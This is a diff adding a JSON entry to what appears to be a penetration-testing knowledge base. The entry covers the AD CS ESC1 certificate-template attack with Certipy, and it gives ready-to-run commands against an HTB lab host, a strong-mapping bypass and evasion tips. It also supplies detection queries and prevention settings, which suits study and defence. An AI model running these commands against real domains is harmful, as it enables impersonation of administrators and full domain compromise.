@@ -1,0 +1,107 @@
+{
+  "id": "ad-esc1-certipy-linux",
+  "name": "AD CS ESC1 via Certipy (Linux - Enrollee-Supplied SAN)",
+  "command": "certipy-ad req -u <user>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <vuln_template> -upn administrator@<domain>",
+  "description": "Linux companion to the Windows ESC1 card. When a certificate template allows the enrollee to supply the Subject Alternative Name (ENROLLEE_SUPPLIES_SUBJECT) and grants client authentication, request a certificate with the SAN set to a privileged user, then authenticate with it via PKINIT to obtain that user's TGT and NT hash.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ADCS",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "HTB Fluffy engagement; Certipy ESC1",
+  "tags": [
+    "adcs",
+    "esc1",
+    "certipy",
+    "san-spoofing",
+    "certificate",
+    "pkinit",
+    "privilege-escalation"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== ESC1 CONDITIONS (all true) ===\n  - Template EKU includes Client Authentication (or Any Purpose / no EKU).\n  - Template has ENROLLEE_SUPPLIES_SUBJECT (you specify the SAN).\n  - Low-privileged users can enroll (enrollment rights).\n  - Manager approval NOT required, no authorized signatures required.\n\n=== FLOW (certipy) ===\n  1. Find it:  certipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout\n       -> template flagged [!] ESC1.\n  2. Request as a privileged SAN:\n       certipy-ad req ... -template <vuln_template> -upn administrator@<domain>\n       (or -sid / -dns for machine/other identities)\n  3. Authenticate:\n       certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>\n       -> administrator TGT + NT hash (UnPAC).\n\n=== ESC1 vs ESC16 ===\n  ESC1 = a specific TEMPLATE lets you supply the SAN.\n  ESC16 = the whole CA drops the SID security extension, so UPN mapping alone wins.\n  If DCs enforce strong mapping (KB5014754), pair ESC1 with -sid for the target's SID.\n\n=== CLOCK ===\n  PKINIT needs time in sync with the DC (see ad-faketime-kerberos).",
+  "examples": [
+    {
+      "label": "Find vulnerable templates",
+      "command": "certipy-ad find -u j.fleischman@fluffy.htb -p '<pass>' -dc-ip 10.129.65.243 -vulnerable -stdout"
+    },
+    {
+      "label": "Request cert with administrator SAN (ESC1)",
+      "command": "certipy-ad req -u j.fleischman@fluffy.htb -p '<pass>' -dc-ip 10.129.65.243 -ca fluffy-DC01-CA -template VulnUser -upn administrator@fluffy.htb"
+    },
+    {
+      "label": "Authenticate as administrator with the cert",
+      "command": "certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.65.243"
+    },
+    {
+      "label": "Strong-mapping bypass: include the target SID",
+      "command": "certipy-ad req -u <user>@<domain> -p <password> -ca <ca_name> -template <vuln_template> -upn administrator@<domain> -sid <target_sid>"
+    }
+  ],
+  "references": [
+    {
+      "title": "Certipy",
+      "url": "https://github.com/ly4k/Certipy"
+    },
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-esc16-upn-manipulation",
+      "note": "ESC16 is the CA-wide sibling when no enrollee-SAN template exists.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-faketime-kerberos",
+      "note": "Fix clock skew before PKINIT cert auth.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The template lets the enrollee specify the SAN and grants client authentication to low-privileged users, so the attacker requests a certificate naming a privileged account and the DC authenticates them as that account via PKINIT.",
+    "prerequisites": "Enrollment rights on an ESC1 template (enrollee-supplied SAN + client-auth EKU, no manager approval) and a clock in sync with the DC.",
+    "impact": "Authentication as any account (up to Domain Admin) via a forged-SAN certificate - domain compromise.",
+    "detection": "[MITRE T1649] Event 4886/4887 on the CA (certificate requested/issued) where the requester differs from the subject/SAN; Event 4768 PKINIT logon as the impersonated account; certipy find flagging the template ESC1.",
+    "artifacts": "4886/4887 CA enrollment with mismatched requester vs SAN; 4768 PKINIT with certificate info; issued .pfx on the attacker host.",
+    "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" (EventCode=4886 OR EventCode=4887)\n| table _time, Requester, CertificateTemplate, ComputerName, Attributes\n\nindex=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4768 Certificate_Thumbprint=*\n| stats count by Account_Name, Client_Address, Certificate_Thumbprint",
+    "elastic_kql": "event.code:(\"4886\" OR \"4887\") AND winlog.event_data.CertificateTemplate:*",
+    "sentinel_kql": "SecurityEvent\n| where EventID in (4886, 4887)\n| project TimeGenerated, Requester, CertificateTemplate, ComputerName\n| join kind=leftouter (\n    SecurityEvent | where EventID == 4768 and isnotempty(CertificateThumbprint)\n    | project PkinitTime=TimeGenerated, TargetUserName, IpAddress, CertificateThumbprint\n) on $left.Requester == $right.TargetUserName\n| sort by TimeGenerated desc",
+    "sigma_rules": "win_security_adcs_esc1_san_certificate_request",
+    "prevention": "Remove ENROLLEE_SUPPLIES_SUBJECT from client-auth templates or require manager approval; restrict enrollment rights; enable strong certificate mapping on DCs (KB5014754 Full Enforcement); audit templates with certipy/PSPKIAudit; treat CA as Tier-0; monitor 4886/4887.",
+    "evasion": "Use the certificate for a single PKINIT auth only; request during normal enrollment activity to blend in.",
+    "sources": [
+      "HTB Fluffy",
+      "MITRE T1649",
+      "Certipy"
+    ],
+    "misconfiguration": "A certificate template grants low-privileged users enrollment, permits an enrollee-supplied SAN, includes a client-authentication EKU, and does not require manager approval.",
+    "vulnerable_config": "# certipy flags it:\ncertipy-ad find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout\n# Look for: [!] ESC1 - 'Enrollee Supplies Subject' + Client Authentication + low-priv enroll.",
+    "secure_config": "# On the template: clear 'Supply in the request' for the subject name, OR require CA manager approval.\n# Restrict enrollment to specific groups. Enable strong certificate mapping on DCs (KB5014754 Full Enforcement)."
+  },
+  "tools": [
+    "certipy"
+  ],
+  "interview": [
+    {
+      "q": "What four template conditions make ESC1 exploitable?",
+      "a": "The template allows the enrollee to supply the SAN (ENROLLEE_SUPPLIES_SUBJECT), includes a client-authentication EKU (or Any Purpose / no EKU), permits low-privileged users to enroll, and does not require manager approval or authorized signatures. Together they let you request a cert naming any account and log in as it.",
+      "role": "pentest"
+    },
+    {
+      "q": "How does KB5014754 strong mapping change the attack, and how do you adapt?",
+      "a": "With Full Enforcement, DCs require a strong SID binding, so a UPN/SAN-only cert is rejected. You adapt by supplying the target's SID in the request (certipy -sid) when you can, or pivot to ESC16 where the CA drops the SID extension entirely.",
+      "role": "both"
+    }
+  ]
+}
